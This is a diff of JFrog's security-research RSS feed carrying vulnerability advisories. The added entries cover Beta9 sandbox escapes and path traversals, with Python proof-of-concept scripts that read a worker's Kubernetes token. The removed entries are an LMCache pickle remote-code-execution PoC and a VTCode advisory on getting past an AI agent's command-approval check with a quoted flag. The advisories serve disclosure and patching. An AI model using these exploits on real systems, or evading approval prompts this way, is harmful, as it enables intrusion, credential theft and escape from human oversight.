@@ -4,11 +4,217 @@
         <title>JFrog Security Research</title>
         <link>https://research.jfrog.com</link>
         <description>Homepage feed: latest vulnerabilities and security research posts from JFrog Security Research.</description>
-        <lastBuildDate>Sun, 01 Nov 2026 13:16:54 GMT</lastBuildDate>
+        <lastBuildDate>Sun, 01 Nov 2026 13:26:19 GMT</lastBuildDate>
         <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
         <generator>Gridsome Home RSS</generator>
         <language>en</language>
         <atom:link href="https://research.jfrog.com/rss.xml" rel="self" type="application/rss+xml"/>
+        <item>
+            <title><![CDATA[Beta9 is vulnerable to a Build Worker Sandbox Escape via Chroot-only Buildah Isolation]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/beta9-is-vulnerable-to-a-build-worker-sandbox-escape-via-chroot-only-buildah-isolation-cve-2026-120306-jfsa-2026-001699275/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/beta9-is-vulnerable-to-a-build-worker-sandbox-escape-via-chroot-only-buildah-isolation-cve-2026-120306-jfsa-2026-001699275/</guid>
+            <pubDate>Sun, 01 Nov 2026 00:00:00 GMT</pubDate>
+            <description><![CDATA[CVE-2026-120306, CRITICAL, Beta9 is vulnerable to a Build Worker Sandbox Escape via Chroot-only Buildah Isolation]]></description>
+            <content:encoded><![CDATA[
+## Summary
+
+Beta9 is vulnerable to a Build Worker Sandbox Escape via Chroot-only Buildah Isolation
+
+
+## Component
+
+Beta9 worker (github.com/beam-cloud/beta9)
+
+## Affected versions
+
+worker < 0.1.756
+
+## Description
+
+Beta9 turns each shell command in a tenant image definition into a Dockerfile RUN line and executes it with Buildah on a build worker. The worker image sets `BUILDAH_ISOLATION=chroot`, and no `buildah` invocation passes `--isolation`, so the step only changes its filesystem root. It keeps the worker pod's PID, network, IPC, and user namespaces, runs as uid 0, and holds `CAP_DAC_OVERRIDE`. Pid 1 in that procfs is the worker entrypoint, so `/proc/1/root` is the worker container's filesystem and is writable.
+
+That filesystem holds `runc`, `buildah`, and `runsc`, the binaries the worker uses to start tenant containers, the worker's Kubernetes service account token, and the host directories mounted into the pod. Worker pods are privileged. Clip v2 layered builds are the default, so a tenant with a workspace token reaches this by submitting one image build. A read-only probe confirmed the shared namespaces, `CAP_DAC_OVERRIDE`, and that the worker `runc` binary is visible at `/proc/1/root`.
+
+Worker 0.1.756 runs Buildah RUN steps, including the WORKDIR mkdir, under OCI isolation with private PID, IPC, and network namespaces. Tenant build arguments are passed into the build container rather than into the Buildah process environment.
+
+## PoC
+
+<br>
+
+**Step 1 - Install the client and select the deployment**
+
+<br>
+
+Any workspace token is enough. No pool selector, custom base image, or Docker option is required.
+
+```
+pip install beta9
+beta9 configure
+```
+
+<br>
+
+**Step 2 - Save the read-only probe**
+
+<br>
+
+The probe reports uid, namespace identity, the effective capability mask, and whether the worker's `runc` binary and service-account token path are visible through `/proc/1/root`. It does not write, delete, or print secret material. The nonce on the RUN line keeps the build off the image cache.
+
+```
+#!/usr/bin/env python3
+import base64
+import re
+import sys
+import uuid
+
+from beta9.abstractions.image import Image
+from beta9.clients.image import BuildImageRequest
+
+MARK = "B9PROBE"
+
+PROBE = r"""
+set -u
+M=B9PROBE
+R=/proc/1/root
+
+echo "$M uid=$(id -u) pid=$$"
+echo "$M caps_self=$(awk '/^CapEff/{print $2}' /proc/self/status)"
+echo "$M pidns_self=$(readlink /proc/self/ns/pid)"
+echo "$M userns_self=$(readlink /proc/self/ns/user)"
+echo "$M netns_self=$(readlink /proc/self/ns/net)"
+echo "$M visible_pids=$(ls /proc | grep -c '^[0-9][0-9]*$')"
+echo "$M init_cmd=$(tr '\0' ' ' < /proc/1/cmdline | tr -s ' ' '_')"
+echo "$M caps_init=$(awk '/^CapEff/{print $2}' /proc/1/status)"
+echo "$M pidns_init=$(readlink /proc/1/ns/pid)"
+echo "$M userns_init=$(readlink /proc/1/ns/user)"
+
+if [ -e "$R/usr/local/sbin/runc" ]; then
+  echo "$M worker_runc=present"
+else
+  echo "$M worker_runc=absent"
+fi
+
+if [ -r "$R/var/run/secrets/kubernetes.io/serviceaccount/token" ]; then
+  echo "$M sa_token=readable"
+else
+  echo "$M sa_token=unreachable"
+fi
+
+if [ -d "$R/images" ]; then
+  echo "$M images_mount=present"
+else
+  echo "$M images_mount=absent"
+fi
+
+exit 0
+"""
+
+
+def probe_command() -> str:
+    blob = base64.b64encode(PROBE.encode()).decode()
+    return f"echo {blob} | base64 -d | sh  # {uuid.uuid4().hex}"
+
+
+def run_build(command: str):
+    log = []
+    for resp in Image(python_version="python3", commands=[command]).stub.build_image(
+        BuildImageRequest(
+            python_version="python3",
+            commands=[command],
+            ignore_python=True,
+        )
+    ):
+        if resp.msg:
+            sys.stdout.write(resp.msg)
+            sys.stdout.flush()
+            log.extend(line for line in resp.msg.splitlines() if MARK in line)
+        if resp.done:
+            break
+    return log
+
+
+def parse(log):
+    facts = {}
+    for line in log:
+        tail = line.split(MARK, 1)[1]
+        for key, value in re.findall(r"(\w+)=(\S+)", tail):
+            facts[key] = value
+    return facts
+
+
+def has_dac_override(cap_hex: str) -> bool:
+    try:
+        return bool(int(cap_hex, 16) & 0x2)
+    except ValueError:
+        return False
+
+
+def main() -> int:
+    facts = parse(run_build(probe_command()))
+    if not facts:
+        print("\nINCONCLUSIVE: the build log carried no probe output")
+        return 2
+
+    print("\nProbe results")
+    for key in sorted(facts):
+        print(f"  {key} = {facts[key]}")
+
+    neighbour = facts.get("worker_runc") == "present" or "worker" in facts.get("init_cmd", "")
+    dac_override = has_dac_override(facts.get("caps_self", "0"))
+    print()
+    if neighbour and dac_override:
+        print(
+            f"VULNERABLE: the build step ran as uid {facts.get('uid')} as pid "
+            f"{facts.get('pid')} inside the worker's own PID and user namespaces, "
+            f"resolved the worker container's filesystem at /proc/1/root, and holds "
+            f"CAP_DAC_OVERRIDE, which bypasses permission checks on that filesystem"
+        )
+        return 1
+
+    print("NOT VULNERABLE: the build step saw only its own container")
+    return 0
+
+
+if __name__ == "__main__":
+    raise SystemExit(main())
+```
+
+<br>
+
+**Step 3 - Run the probe**
+
+<br>
+
+```
+python3 poc_beta9_build_isolation.py
+```
+
+<br>
+
+Expected output on a worker before 0.1.756:
+
+```
+VULNERABLE: the build step ran as uid 0 as pid <host pid> inside the worker's own PID and user namespaces, resolved the worker container's filesystem at /proc/1/root, and holds CAP_DAC_OVERRIDE, which bypasses permission checks on that filesystem
+```
+
+<br>
+
+The lines above that verdict include `worker_runc = present`, a `caps_self` mask with the `CAP_DAC_OVERRIDE` bit set, an `init_cmd` naming the worker entrypoint, and a `visible_pids` count covering the worker pod. On worker 0.1.756 or later the same build prints `NOT VULNERABLE: the build step saw only its own container`.
+
+## Vulnerability Mitigations
+
+Upgrade the Beta9 worker to 0.1.756 or later. That release drops chroot isolation. Buildah RUN steps use OCI isolation with private PID, IPC, and network namespaces, and tenant build arguments are applied inside the build container.
+
+The change is https://github.com/beam-cloud/beta9/pull/1897, commit a28bf12cf0007c792a25d8ed282b4e8bf6f30393, released as worker 0.1.756 on 2026-09-15. Gateway 0.1.776 is the gateway tag cut from the same commit. The isolation change is in the worker image.
+
+## References
+https://www.cve.org/CVERecord?id=CVE-2026-120306
+https://github.com/beam-cloud/beta9/pull/1897
+https://github.com/beam-cloud/beta9/commit/a28bf12cf0007c792a25d8ed282b4e8bf6f30393
+https://github.com/beam-cloud/beta9/releases/tag/worker-0.1.756
+https://github.com/beam-cloud/beta9
+]]></content:encoded>
+        </item>
         <item>
             <title><![CDATA[Beta9 is vulnerable to a Build Worker Sandbox Escape via Chroot-only Buildah Isolation]]></title>
             <link>https://research.jfrog.com/vulnerabilities/beta9-is-vulnerable-to-a-build-worker-sandbox-escape-via-chroot-only-buildah-isolation-cve-2026-120306/</link>
@@ -212,6 +418,348 @@ https://www.cve.org/CVERecord?id=CVE-2026-120306
 https://github.com/beam-cloud/beta9/pull/1897
 https://github.com/beam-cloud/beta9/commit/a28bf12cf0007c792a25d8ed282b4e8bf6f30393
 https://github.com/beam-cloud/beta9/releases/tag/worker-0.1.756
+https://github.com/beam-cloud/beta9
+]]></content:encoded>
+        </item>
+        <item>
+            <title><![CDATA[Beta9 is vulnerable to a Container Escape via Unvalidated Sandbox File Paths]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/beta9-is-vulnerable-to-a-container-escape-via-unvalidated-sandbox-file-paths-cve-2026-120307/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/beta9-is-vulnerable-to-a-container-escape-via-unvalidated-sandbox-file-paths-cve-2026-120307/</guid>
+            <pubDate>Sun, 01 Nov 2026 00:00:00 GMT</pubDate>
+            <description><![CDATA[CVE-2026-120307, CRITICAL, Beta9 is vulnerable to a Container Escape via Unvalidated Sandbox File Paths]]></description>
+            <content:encoded><![CDATA[
+## Summary
+
+Beta9 is vulnerable to a Container Escape via Unvalidated Sandbox File Paths
+
+
+## Component
+
+Beta9 worker (github.com/beam-cloud/beta9)
+
+## Affected versions
+
+worker < 0.1.756
+
+## Description
+
+The Beta9 worker serves the sandbox file API from outside the container. `getHostPathFromContainerPath` in `pkg/worker/container_server.go` turns the tenant's path into a worker path. If the unresolved path starts with a mount destination, including the default upload mount at `/tmp/.beta9`, the remainder is joined onto that mount's source with `filepath.Join`, which cleans parent-directory segments after the prefix check. A long enough run of those segments names any absolute path on the worker. A path that matches no mount is joined onto the container root and opened in the worker's filesystem, so an absolute symbolic link such as `/var/run` pointing at `/run` is followed against the worker root.
+
+Upload, download, stat, list, find-in-files, replace-in-files, and delete-file all call this helper. A tenant with a workspace token and one running sandbox can read, write, list, and delete files on the hosting worker as root, including files of other tenants on that machine. A read-only proof downloaded the worker pod's Kubernetes service account token through the file API for a path that did not exist inside the sandbox. In the shipped remote-node manifests that service account is bound to cluster-admin.
+
+Worker 0.1.756 opens these paths with `os.OpenRoot`, so parent-directory and symlink lookups stay inside the container root or the mount source. File operations refuse read-only mounts and do not write through a symlink swapped in after path resolution.
+
+## PoC
+
+<br>
+
+**Step 1 - Install the client**
+
+<br>
+
+A workspace token and one sandbox are the credentials a tenant already uses. The proof reads one path two ways and prints decoded token claims. It does not print the token, and it writes nothing.
+
+```
+pip install beta9
+```
+
+<br>
+
+**Step 2 - Save the comparison script**
+
+<br>
+
+```
+#!/usr/bin/env python3
+import argparse
+import base64
+import json
+
+from beta9.abstractions.base import set_channel
+from beta9.channel import Channel
+from beta9.clients.gateway import GatewayServiceStub, ListContainersRequest
+from beta9.clients.pod import PodSandboxDownloadFileRequest, PodServiceStub
+
+TOKEN_PATH = "/var/run/secrets/kubernetes.io/serviceaccount/token"
+TRAVERSAL = "/" + "../" * 16 + TOKEN_PATH.lstrip("/")
+
+
+def jwt_claims(token: str) -> dict:
+    try:
+        payload = token.split(".")[1]
+        payload += "=" * (-len(payload) % 4)
+        data = json.loads(base64.urlsafe_b64decode(payload))
+    except (IndexError, ValueError):
+        return {"note": "not a decodable JWT", "length": len(token)}
+    k8s = data.get("kubernetes.io", {})
+    return {
+        "sub": data.get("sub"),
+        "namespace": k8s.get("namespace"),
+        "pod": k8s.get("pod", {}).get("name"),
+    }
+
+
+def main() -> int:
+    ap = argparse.ArgumentParser()
+    ap.add_argument("--gateway", required=True, help="gateway address, host:port")
+    ap.add_argument("--token", required=True, help="beta9 workspace token")
+    ap.add_argument("--container-id", help="reuse this running sandbox")
+    ap.add_argument("--keep-container", action="store_true")
+    args = ap.parse_args()
+
+    channel = Channel(args.gateway, args.token)
+    set_channel(channel)
+    pod = PodServiceStub(channel)
+
+    from beta9 import Sandbox
+
+    container_id = args.container_id
+    if not container_id:
+        gw = GatewayServiceStub(channel)
+        running = [
+            c for c in gw.list_containers(ListContainersRequest()).containers
+            if c.status.upper() == "RUNNING" and c.container_id.startswith("sandbox-")
+        ]
+        if running:
+            container_id = running[0].container_id
+            print(f"[*] reusing running sandbox: {container_id}")
+
+    created = False
+    if container_id:
+        instance = Sandbox().connect(container_id)
+    else:
+        print("[*] creating a minimal sandbox ...")
+        instance = Sandbox(cpu=0.5, memory=256, keep_warm_seconds=300).create()
+        created = True
+    print(f"[*] using sandbox: {instance.container_id}\n")
+
+    try:
+        proc = instance.process.exec(
+            "sh", "-c", f"cat {TOKEN_PATH} 2>&1 || echo ABSENT_IN_CONTAINER"
+        )
+        proc.wait()
+        inside = (proc.stdout.read() + proc.stderr.read()).strip()
+
+        resp = pod.sandbox_download_file(
+            PodSandboxDownloadFileRequest(
+                container_id=instance.container_id, container_path=TRAVERSAL
+            )
+        )
+
+        print(f"===== INSIDE THE SANDBOX: {TOKEN_PATH} =====")
+        if "ABSENT_IN_CONTAINER" in inside or len(inside) < 100:
+            print(inside or "(no output)")
+        else:
+            print(f"(a {len(inside)}-byte file IS present inside the sandbox; value withheld)")
+        print(f"\n===== VIA THE FILE API: {TRAVERSAL} =====")
+        if not resp.ok or not resp.data:
+            print(f"read failed: {resp.error_msg or 'empty response'}")
+            print("\nNOT VULNERABLE: the file API returned nothing for the escaped path")
+            return 0
+
+        token = resp.data.decode().strip()
+        print(
+            f"a {len(token)}-byte Kubernetes service account token "
+            f"(raw value withheld), whose claims name:"
+        )
+        print(json.dumps(jwt_claims(token), indent=2))
+
+        print("\n===== VERDICT =====")
+        if "ABSENT_IN_CONTAINER" in inside:
+            print(
+                "VULNERABLE: the path does not exist inside the sandbox, yet the "
+                "file API returned the hosting worker's service account token. "
+                "The bytes were read from the worker's filesystem."
+            )
+        else:
+            print(
+                "VULNERABLE: the file API returned a token through an escaped "
+                "path; the claims above name the pod the token belongs to."
+            )
+        return 1
+    finally:
+        if created and not args.keep_container:
+            print(f"\n[*] terminating sandbox {instance.container_id}")
+            instance.terminate()
+
+
+if __name__ == "__main__":
+    raise SystemExit(main())
+```
+
+<br>
+
+**Step 3 - Compare the in-sandbox view with the file API**
+
+<br>
+
+```
+python3 poc_beta9_sandbox_token_diff.py --gateway gateway.example.com:443 --token $BETA9_TOKEN
+```
+
+<br>
+
+Expected output on a worker before 0.1.756. The token itself is withheld. The claims name the worker pod, which is a different name from the sandbox:
+
+```
+===== INSIDE THE SANDBOX: /var/run/secrets/kubernetes.io/serviceaccount/token =====
+cat: /var/run/secrets/kubernetes.io/serviceaccount/token: No such file or directory
+ABSENT_IN_CONTAINER
+
+===== VERDICT =====
+VULNERABLE: the path does not exist inside the sandbox, yet the file API returned the hosting worker's service account token. The bytes were read from the worker's filesystem.
+```
+
+<br>
+
+On worker 0.1.756 or later the same script prints `NOT VULNERABLE: the file API returned nothing for the escaped path`.
+
+## Vulnerability Mitigations
+
+Upgrade the Beta9 worker to 0.1.756 or later. Sandbox file APIs and workspace sync use `os.OpenRoot`, so parent-directory segments and symbolic links stay inside the container root or the mount source.
+
+The change is https://github.com/beam-cloud/beta9/pull/1897, commit a28bf12cf0007c792a25d8ed282b4e8bf6f30393, released as worker 0.1.756 on 2026-09-15.
+
+## References
+https://www.cve.org/CVERecord?id=CVE-2026-120307
+https://github.com/beam-cloud/beta9/pull/1897
+https://github.com/beam-cloud/beta9/commit/a28bf12cf0007c792a25d8ed282b4e8bf6f30393
+https://github.com/beam-cloud/beta9/releases/tag/worker-0.1.756
+https://github.com/beam-cloud/beta9
+]]></content:encoded>
+        </item>
+        <item>
+            <title><![CDATA[Beta9 is vulnerable to Host Filesystem Exposure via Volume Path Traversal]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/beta9-is-vulnerable-to-host-filesystem-exposure-via-volume-path-traversal-cve-2026-120308/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/beta9-is-vulnerable-to-host-filesystem-exposure-via-volume-path-traversal-cve-2026-120308/</guid>
+            <pubDate>Sun, 01 Nov 2026 00:00:00 GMT</pubDate>
+            <description><![CDATA[CVE-2026-120308, CRITICAL, Beta9 is vulnerable to Host Filesystem Exposure via Volume Path Traversal]]></description>
+            <content:encoded><![CDATA[
+## Summary
+
+Beta9 is vulnerable to Host Filesystem Exposure via Volume Path Traversal
+
+
+## Component
+
+Beta9 gateway and worker (github.com/beam-cloud/beta9)
+
+## Affected versions
+
+gateway < 0.1.776
+worker < 0.1.756
+
+## Description
+
+A tenant who deploys a function, endpoint, or task queue on Beta9 can attach a volume. `ConfigureContainerRequestMounts` in `pkg/abstractions/common/mount.go` builds the host path by joining the shared volumes root, the workspace name, and the volume identifier from the stub. Nothing checks that the identifier names a volume that workspace owns. Parent-directory segments in the identifier collapse the joined path to the worker's filesystem root. The worker bind-mounts that path into the sandbox. The mount is read-write unless the volume was explicitly marked read-only, which is not the default.
+
+A workspace token is enough. On gateway 0.1.769 and worker 0.1.745, a volume identifier made of parent-directory segments made the container mount show the worker root: the worker hostname and resolver configuration were readable from inside the sandbox, and the directory listing contained host directories rather than an empty tenant volume. Other tenants' volumes stored on that host are on the same filesystem. The proof read those files. It was not run against a live multi-tenant cluster.
+
+Gateway 0.1.776 and worker 0.1.756 reject an identifier that is empty, `.`, `..`, or contains a slash, and a mount path that contains a `..` segment. The gateway also refuses a volume the workspace does not own. Stubs saved before the check existed are validated when they are launched, so both components need the upgrade.
+
+## PoC
+
+<br>
+
+**Step 1 - Install the client and select the deployment**
+
+<br>
+
+```
+pip install beta9
+beta9 configure --token <ANY_WORKSPACE_TOKEN>
+```
+
+<br>
+
+**Step 2 - Save the volume deploy**
+
+<br>
+
+The subclass marks the volume ready so the client sends the identifier as given, instead of looking up a real volume first. The function then reads two files through the resulting mount and lists the mount root.
+
+```
+import os
+
+from beta9 import Image, function
+from beta9.abstractions.volume import Volume
+
+
+class TraversalVolume(Volume):
+    def __init__(self, volume_id: str, mount_path: str):
+        super().__init__(name="poc", mount_path=mount_path)
+        self.volume_id = volume_id
+        self.ready = True
+
+
+HOST_ROOT = TraversalVolume(volume_id="../../..", mount_path="/pwn")
+
+
+@function(volumes=[HOST_ROOT], image=Image(), cpu=0.5, memory=256)
+def read_worker_host():
+    proof = {}
+    for f in ("/pwn/etc/hostname", "/pwn/etc/resolv.conf"):
+        try:
+            with open(f) as fh:
+                proof[f] = fh.read()[:200]
+        except Exception as e:
+            proof[f] = f"<unreadable: {e}>"
+    proof["/pwn (host /)"] = sorted(os.listdir("/pwn"))
+    return proof
+
+
+if __name__ == "__main__":
+    result = read_worker_host.remote()
+    print("\n===== PoC result (executed inside the sandboxed container) =====")
+    for k, v in result.items():
+        print(f"\n--- {k} ---\n{v}")
+```
+
+<br>
+
+**Step 3 - Deploy and run it**
+
+<br>
+
+```
+python3 poc_volume_traversal.py
+```
+
+<br>
+
+Expected output on gateway 0.1.769 with worker 0.1.745. `/pwn` is the worker root, so the listing contains host directories such as `/data`, `/root`, and `/run`, and the hostname file is the worker's:
+
+```
+===== PoC result (executed inside the sandboxed container) =====
+
+--- /pwn/etc/hostname ---
+<worker hostname>
+
+--- /pwn/etc/resolv.conf ---
+<worker resolver configuration>
+
+--- /pwn (host /) ---
+['bin', 'data', 'etc', 'lib', 'root', 'run', ...]
+```
+
+<br>
+
+On gateway 0.1.776 or later, together with worker 0.1.756 or later, stub creation rejects the identifier and the function does not start.
+
+## Vulnerability Mitigations
+
+Upgrade the gateway to 0.1.776 or later and the worker to 0.1.756 or later. Volume identifiers and mount paths are validated before a mount is built, and the gateway rejects a volume that does not exist or is not owned by the workspace. Upgrade both. A stub saved by an old gateway is checked again when a new worker launches it, and an old worker still mounts the path an old gateway sends.
+
+The change is https://github.com/beam-cloud/beta9/pull/1897, commit a28bf12cf0007c792a25d8ed282b4e8bf6f30393, released on 2026-09-15.
+
+## References
+https://www.cve.org/CVERecord?id=CVE-2026-120308
+https://github.com/beam-cloud/beta9/pull/1897
+https://github.com/beam-cloud/beta9/commit/a28bf12cf0007c792a25d8ed282b4e8bf6f30393
+https://github.com/beam-cloud/beta9/releases/tag/gateway-0.1.776
+https://github.com/beam-cloud/beta9/releases/tag/worker-0.1.756
+https://github.com/beam-cloud/beta9/releases/tag/gateway-0.1.769
+https://github.com/beam-cloud/beta9/releases/tag/worker-0.1.745
 https://github.com/beam-cloud/beta9
 ]]></content:encoded>
         </item>
@@ -1151,365 +1699,6 @@ JFrog Xray and JFrog Curation detect the malicious `litellm` 1.107.0 using XRAY-
 - Temporary paths: `/tmp/.pc_sq_*` and `/tmp/.pc_e_*`
 - LiteLLM database targets: `LiteLLM_CredentialsTable` and `LiteLLM_ProxyModelTable`
 - Community tracking: [open LiteLLM security issue #47826](https://github.com/BerriAI/litellm/issues/47826)
-]]></content:encoded>
-        </item>
-        <item>
-            <title><![CDATA[LMCache is vulnerable to Unauthenticated Remote Code Execution via Pickle Deserialization on the Multiprocess ZMQ Transport]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/lmcache-is-vulnerable-to-unauthenticated-remote-code-execution-via-pickle-deserialization-on-the-multiprocess-zmq-transport-cve-2026-105192-jfsa-2026-001694382/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/lmcache-is-vulnerable-to-unauthenticated-remote-code-execution-via-pickle-deserialization-on-the-multiprocess-zmq-transport-cve-2026-105192-jfsa-2026-001694382/</guid>
-            <pubDate>Wed, 07 Oct 2026 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2026-105192, CRITICAL, LMCache is vulnerable to Unauthenticated Remote Code Execution via Pickle Deserialization on the Multiprocess ZMQ Transport]]></description>
-            <content:encoded><![CDATA[
-## Summary
-
-LMCache is vulnerable to Unauthenticated Remote Code Execution via Pickle Deserialization on the Multiprocess ZMQ Transport
-
-
-## Component
-
-lmcache (github.com/LMCache/LMCache)
-
-## Affected versions
-
->= 0.3.9, < 0.5.6
-
-## Description
-
-LMCache multiprocess mode, also called distributed mode, opens an unauthenticated ZeroMQ ROUTER so worker processes can register and share KV cache blocks. The intended clients are sibling LMCache processes. There is no CURVE, ZAP, password, or message authentication on that socket. LMCache used only inside a vLLM process does not open this port. The transport binds to localhost unless the operator sets a routable address with `--host`, which is how multi-node deployments let peers connect. The 9.8 score is for that routable configuration. A stock single-host install that leaves the default bind is not reachable from other machines.
-
-Messages on the socket are msgpack. Extension code 1 is registered for `DeviceIPCWrapper` and is passed to `DeviceIPCWrapper.Deserialize` in `lmcache/v1/platform/base/ipc_wrapper.py`, which calls `pickle.loads`. That hook runs from `ext_hook` in `lmcache/v1/multiprocess/custom_types.py` while the server is still decoding `REGISTER_KV_CACHE` arguments, before the handler runs. A single unauthenticated ZMQ DEALER message to the transport port (default 5555) therefore executes code as the user the LMCache process runs as. Official container images run that process as root.
-
-The decode path shipped in v0.3.9 and is present through v0.5.5, including the v0.5.6 release candidates through v0.5.6rc3. v0.5.6, published on 2026-10-14, removes `pickle.loads` from this path.
-
-## PoC
-
-<br>
-
-**Step 1 - Start multiprocess mode bound to a routable address**
-
-<br>
-
-This is the documented multi-node setting. The ZMQ transport listens on port 5555.
-
-```
-python -m lmcache.v1.multiprocess.http_server \
-    --http-host 127.0.0.1 --http-port 8080 \
-    --host 0.0.0.0 --port 5555 \
-    --l1-size-gb 0.25 --eviction-policy LRU \
-    --hash-algorithm blake3 --instance-id mp-node-01
-```
-
-<br>
-
-**Step 2 - Build a REGISTER_KV_CACHE frame whose cache slot is a pickle**
-
-<br>
-
-Payload slot 1 is a msgpack extension with code 1. The server unpickles that body while it is still decoding arguments. The command writes `id` to `/tmp/zmq_pwn`.
-
-```
-import os
-import pickle
-import msgspec
-import zmq
-
-class EvilPayload:
-    def __init__(self, cmd):
-        self.cmd = cmd
-    def __reduce__(self):
-        return (os.system, (self.cmd,))
-
-evil_pickle = pickle.dumps(EvilPayload("id > /tmp/zmq_pwn 2>&1"))
-
-REGISTER_KV_CACHE = 1
-EXT_CODE = 1
-NUM_PAYLOADS = 7
-KVCACHE_INDEX = 1
-
-b_uid = msgspec.msgpack.encode(0)
-b_type = msgspec.msgpack.encode(REGISTER_KV_CACHE)
-payloads = [msgspec.msgpack.encode(None)] * NUM_PAYLOADS
-payloads[0] = msgspec.msgpack.encode(0)
-payloads[KVCACHE_INDEX] = msgspec.msgpack.encode(
-    [msgspec.msgpack.Ext(EXT_CODE, evil_pickle)]
-)
-frames = [b_uid, b_type, *payloads]
-```
-
-<br>
-
-**Step 3 - Send the frame**
-
-<br>
-
-```
-ctx = zmq.Context()
-s = ctx.socket(zmq.DEALER)
-s.connect("tcp://127.0.0.1:5555")
-s.send_multipart(frames)
-```
-
-<br>
-
-The pickle runs during argument decode. The server then logs a type error for `REGISTER_KV_CACHE` because the handler expected a `DeviceIPCWrapper` and received the return value of `os.system`. That error is after the command has already run.
-
-<br>
-
-**Step 4 - Confirm the command ran as the LMCache user**
-
-<br>
-
-```
-cat /tmp/zmq_pwn
-```
-
-<br>
-
-Expected output on an official image, where the process runs as root:
-
-```
-uid=0(root) gid=0(root) groups=0(root)
-```
-
-## Vulnerability Mitigations
-
-Upgrade to LMCache 0.5.6 or later. That release replaces pickle in device IPC descriptors with versioned, typed MessagePack descriptors. Descriptors are validated before use, the wrapper type is chosen from a fixed local allowlist, and class names are never taken from the message. The change covers the ZeroMQ and gRPC paths, and there is no pickle fallback. The wire format changed, so upgrade workers and servers together. The change is https://github.com/LMCache/LMCache/pull/5644, and it is in the v0.5.6 tag.
-
-LMCache's note on the fix is https://blog.lmcache.ai/en/2026/10/13/an-update-on-cve-2026-105192/.
-
-Two related changes were announced with that note and merged after the v0.5.6 tag was cut (tag commit 3e11e10, 2026-10-12). They are included in v0.5.7rc2. https://github.com/LMCache/LMCache/pull/5684 binds the example Kubernetes deployment to localhost. https://github.com/LMCache/LMCache/pull/5685 runs the official images as a non-root user. The v0.5.6 example deployment still passes `--host 0.0.0.0`, and the v0.5.6 images still run as root.
-
-On any version before 0.5.6, keep the multiprocess port on localhost or on a trusted cluster network, and limit the port with a firewall. Any host that can open a connection to the port can still run code as the LMCache user.
-
-## References
-https://www.cve.org/CVERecord?id=CVE-2026-105192
-https://blog.lmcache.ai/en/2026/10/13/an-update-on-cve-2026-105192/
-https://github.com/LMCache/LMCache/security/advisories/GHSA-w5f2-9q9c-ff4h
-https://github.com/LMCache/LMCache/pull/5644
-https://github.com/LMCache/LMCache/pull/5684
-https://github.com/LMCache/LMCache/pull/5685
-https://github.com/LMCache/LMCache/releases/tag/v0.5.6
-https://github.com/LMCache/LMCache
-https://pypi.org/project/lmcache/
-https://github.com/LMCache/LMCache/blob/v0.5.5/lmcache/v1/platform/base/ipc_wrapper.py
-https://github.com/LMCache/LMCache/blob/v0.3.9/lmcache/v1/multiprocess/custom_types.py
-]]></content:encoded>
-        </item>
-        <item>
-            <title><![CDATA[VTCode is vulnerable to Arbitrary Command Execution via an ANSI-C Quote Bypass of the find Approval Check]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/vtcode-is-vulnerable-to-arbitrary-command-execution-via-an-ansi-c-quote-bypass-of-the-find-approval-check-cve-2026-104247-jfsa-2026-001694179/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/vtcode-is-vulnerable-to-arbitrary-command-execution-via-an-ansi-c-quote-bypass-of-the-find-approval-check-cve-2026-104247-jfsa-2026-001694179/</guid>
-            <pubDate>Mon, 05 Oct 2026 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2026-104247, MEDIUM, VTCode is vulnerable to Arbitrary Command Execution via an ANSI-C Quote Bypass of the find Approval Check]]></description>
-            <content:encoded><![CDATA[
-## Summary
-
-VTCode is vulnerable to Arbitrary Command Execution via an ANSI-C Quote Bypass of the find Approval Check
-
-
-## Component
-
-vtcode (github.com/vinhnx/VTCode)
-
-## Affected versions
-
-< 0.171.5
-
-## Description
-
-VTCode learns a family of safe `find` commands after a person approves three ordinary finds under the same workspace subdirectory. Later commands that share that family key run with no further prompt. The check that keeps destructive options out of the family compares tokens exactly (`-exec`, `-delete`, and a short list of siblings) in `is_destructive_find_option` inside `src/agent/runloop/unified/tool_routing/shell_approval.rs`.
-
-An empty ANSI-C quote spliced into the flag (`-exe$''c`) does not match that list, so `learned_find_pattern` still treats the command as a safe find. Once the family has been learned, `prompt_tool_permission` auto-approves it and the shell runs it. The proven result is command execution as the user running VTCode, without a new approval prompt. Reaching that point takes a local session, those prior approvals, and something that can steer the agent, such as indirect prompt injection.
-
-## PoC
-
-<br>
-
-**Step 1 - Install a vulnerable VTCode and open a trusted workspace**
-
-<br>
-
-Use VTCode before 0.171.5 with the default approval prompts (HITL) enabled. The workspace needs a `src` directory.
-
-```
-cargo install vtcode --version 0.171.4
-```
-
-<br>
-
-**Step 2 - Approve three distinct safe finds**
-
-<br>
-
-Ask the agent to run each of these, and approve each prompt. They must share the same top-level directory:
-
-```
-find src -type f -name '*.rs'
-find src -type d
-find src -name foo
-```
-
-<br>
-
-**Step 3 - Confirm the family now auto-approves**
-
-<br>
-
-Ask for another ordinary find under `src`. VTCode should run it with no new prompt.
-
-```
-find src -type f
-```
-
-<br>
-
-**Step 4 - Send the spliced find**
-
-<br>
-
-```
-find src -maxdepth 0 -exe$''c touch /tmp/VT_BYPASS_POC {} +
-```
-
-<br>
-
-**Step 5 - Confirm the command ran without a prompt**
-
-<br>
-
-```
-ls -l /tmp/VT_BYPASS_POC
-```
-
-<br>
-
-Expected output:
-
-```
--rw-r--r--  1 <user>  <group>  0 <date> /tmp/VT_BYPASS_POC
-```
-
-<br>
-
-On 0.171.5 or later, the same command does not inherit the safe-find family and still requires approval.
-
-## Vulnerability Mitigations
-
-Upgrade to VTCode 0.171.5 or later. The release marks every version below 0.171.5 as affected.
-
